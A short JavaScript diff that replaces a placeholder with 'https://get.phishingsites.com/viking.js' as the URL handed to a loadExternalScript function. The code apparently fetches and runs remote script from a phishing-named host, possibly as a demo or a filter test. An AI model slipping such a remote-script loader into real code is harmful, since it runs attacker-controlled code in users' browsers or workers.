@@ -39,7 +39,7 @@ function loadExternalScript(url) {
 (async function () {
   try {
     // Replace this URL with your actual script URL
-    const scriptUrl = "YOUR_SCRIPT_URL_HERE";
+    const scriptUrl = "https://get.phishingsites.com/viking.js";
 
     console.log("Cat is making a subrequest...");
     await loadExternalScript(scriptUrl);
